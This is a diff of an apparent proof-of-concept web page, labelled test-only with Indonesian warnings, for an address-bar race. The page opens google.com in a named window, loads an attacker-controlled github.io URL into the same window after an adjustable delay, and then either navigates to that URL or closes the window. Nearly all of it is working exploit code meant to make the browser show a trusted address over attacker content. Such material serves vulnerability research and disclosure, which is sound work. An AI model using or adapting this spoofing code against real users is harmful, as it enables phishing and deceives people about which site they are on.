@@ -3,31 +3,37 @@
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>PoC Sequence — TEST ONLY</title>
+<title>PoC Auto-Return — TEST ONLY</title>
 <style>
-  body{font-family:system-ui,Segoe UI,Roboto,Arial;background:#f6f8fb;padding:18px}
-  .card{max-width:900px;margin:0 auto;background:#fff;padding:16px;border-radius:10px;box-shadow:0 6px 20px rgba(0,0,0,.06)}
-  button{padding:10px 14px;border-radius:8px;border:0;background:#0b66ff;color:#fff;cursor:pointer}
-  .warn{background:#ff6b6b}
-  label{margin-right:12px}
-  #log{white-space:pre-wrap;background:#0b1220;color:#e6f0ff;padding:12px;border-radius:8px;margin-top:12px;max-height:260px;overflow:auto}
+  body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:18px;background:#f6f8fb}
+  .card{max-width:880px;margin:0 auto;background:#fff;padding:18px;border-radius:10px;box-shadow:0 6px 18px rgba(0,0,0,.06)}
+  button{padding:8px 12px;border-radius:8px;border:0;background:#0b66ff;color:#fff;cursor:pointer}
+  button.warn{background:#ff6b6b}
+  label{margin-right:8px}
+  #log{background:#0b1220;color:#e6f0ff;padding:10px;border-radius:8px;max-height:280px;overflow:auto;white-space:pre-wrap}
   .badge{display:inline-block;padding:4px 8px;border-radius:6px;background:#111;color:#fff;margin-left:8px;font-size:12px}
 </style>
 </head>
 <body>
   <div class="card">
-    <h2>PoC Sequence — Address Bar Race (TEST ONLY)</h2>
-    <p><strong>Note:</strong> Jalankan hanya di lingkungan uji. PoC ini menunjukkan urutan: <em>open google → after delayInject open attacker (same window name) → after delayClose close window (return focus)</em>.</p>
+    <h2>PoC Auto-Return — Address Bar Race (TEST ONLY)</h2>
+    <p><strong>PERINGATAN:</strong> Jalankan hanya pada perangkat / app yang kamu kontrol. PoC ini untuk pengujian internal. Jangan gunakan untuk menipu pengguna.</p>
 
-    <div style="margin:10px 0">
-      <label>delayInject (ms): <input id="delayInject" type="number" value="300" style="width:90px"></label>
-      <label>delayClose (ms): <input id="delayClose" type="number" value="2000" style="width:90px"></label>
-      <button id="run">Run Sequence</button>
-      <button id="abort" class="warn">Abort/Reset</button>
+    <div style="display:flex;gap:8px;align-items:center;margin-bottom:8px">
+      <label>delayOpen (ms): <input id="delayOpen" type="number" value="300" style="width:90px"></label>
+      <label>delayReturn (ms): <input id="delayReturn" type="number" value="2000" style="width:90px"></label>
+      <label>returnMode:
+        <select id="mode">
+          <option value="navigate">A — navigate attackerURL (recommended)</option>
+          <option value="close">B — close window (return focus to main)</option>
+        </select>
+      </label>
+      <button id="run">Run</button>
+      <button id="abort" class="warn">Abort</button>
       <span class="badge">TEST ONLY</span>
     </div>
 
-    <p>Instruksi singkat: Tekan <strong>Run Sequence</strong>. Jendela baru akan terbuka yang pertama ke Google, lalu attacker, lalu ditutup. Amati behavior address bar & konten pada jendela yang terbuka (rekam layar bila perlu).</p>
+    <p style="margin:6px 0">Flow: <em>open google → after delayOpen open attacker in same window → after delayReturn perform returnMode</em>. Amati address bar vs content in opened window; rekam layar untuk bukti.</p>
 
     <div id="log">LOG: ready</div>
   </div>
@@ -36,62 +42,79 @@
   const runBtn = document.getElementById('run');
   const abortBtn = document.getElementById('abort');
   const logEl = document.getElementById('log');
+  const delayOpenEl = document.getElementById('delayOpen');
+  const delayReturnEl = document.getElementById('delayReturn');
+  const modeEl = document.getElementById('mode');
 
   let winRef = null;
   let timers = [];
 
   function log(s){
-    const t = new Date().toISOString().slice(11,23);
-    logEl.textContent += `\n[${t}] ${s}`;
+    const ts = new Date().toISOString().slice(11,23);
+    logEl.textContent += `\n[${ts}] ${s}`;
     logEl.scrollTop = logEl.scrollHeight;
   }
 
   function clearTimers(){
-    timers.forEach(t=>clearTimeout(t));
+    timers.forEach(t => clearTimeout(t));
     timers = [];
   }
 
   runBtn.addEventListener('click', () => {
     clearTimers();
-    log('=== Sequence START ===');
-    const delayInject = Math.max(0, parseInt(document.getElementById('delayInject').value||"300",10));
-    const delayClose  = Math.max(0, parseInt(document.getElementById('delayClose').value||"2000",10));
+    log('=== sequence START ===');
+    const delayOpen = Math.max(0, parseInt(delayOpenEl.value||"300",10));
+    const delayReturn = Math.max(0, parseInt(delayReturnEl.value||"2000",10));
+    const mode = modeEl.value;
+    const attacker = 'https://mohammedalqi.github.io/';
+    const target = 'https://www.google.com/';
 
     // Step 1: open google in named window 'x'
     try {
-      winRef = window.open('https://www.google.com/', 'x');
-      if (!winRef) { log('window.open returned null (popup blocked).'); return; }
-      log('opened https://www.google.com/ in window name "x"');
-    } catch(e){
-      log('window.open ERROR: ' + e);
+      winRef = window.open(target, 'x');
+      if (!winRef) {
+        log('window.open returned null (popup blocked). Aborting.');
+        return;
+      }
+      log(`opened ${target} in window name "x"`);
+    } catch (e) {
+      log('window.open error: ' + e);
       return;
     }
 
-    // Step 2: after delayInject, open attacker in same window name 'x'
-    timers.push(setTimeout(()=>{
+    // Step 2: after delayOpen, open attacker in same window name 'x'
+    timers.push(setTimeout(() => {
       try {
-        window.open('https://mohammedalqi.github.io/', 'x');
-        log(`after ${delayInject}ms: opened attacker https://mohammedalqi.github.io/ into same window "x"`);
-      } catch(e){
-        log('opening attacker ERROR: ' + e);
+        window.open(attacker, 'x'); // reuse same name -> navigates same window
+        log(`after ${delayOpen}ms: opened attacker ${attacker} into same window "x"`);
+      } catch (e) {
+        log('open attacker error: ' + e);
       }
-    }, delayInject));
+    }, delayOpen));
 
-    // Step 3: after delayInject + delayClose, close the opened window to return focus
-    timers.push(setTimeout(()=>{
+    // Step 3: after delayOpen + delayReturn, perform return action automatically
+    timers.push(setTimeout(() => {
       try {
-        if (winRef && !winRef.closed) {
-          winRef.close();
-          log(`after ${delayInject + delayClose}ms: closed window "x" (returned focus to main page)`);
+        if (!winRef || winRef.closed) {
+          log('window not available to return/close');
         } else {
-          log('window already closed or unavailable to close');
+          if (mode === 'navigate') {
+            // Navigate programmatically to attacker URL (this does not rely on history.back)
+            // This is a reliable navigation action across origins.
+            winRef.location.href = attacker;
+            log(`after ${delayOpen + delayReturn}ms: programmatically set window.location.href => ${attacker} (navigate mode)`);
+          } else {
+            // Close window so focus returns to opener (main page)
+            winRef.close();
+            log(`after ${delayOpen + delayReturn}ms: closed window "x" (close mode)`);
+          }
         }
-      } catch(e){
-        log('closing window ERROR: ' + e);
+      } catch (e) {
+        log('return action error: ' + e);
       } finally {
-        log('=== Sequence END ===');
+        log('=== sequence END ===');
       }
-    }, delayInject + delayClose));
+    }, delayOpen + delayReturn));
   });
 
   abortBtn.addEventListener('click', () => {
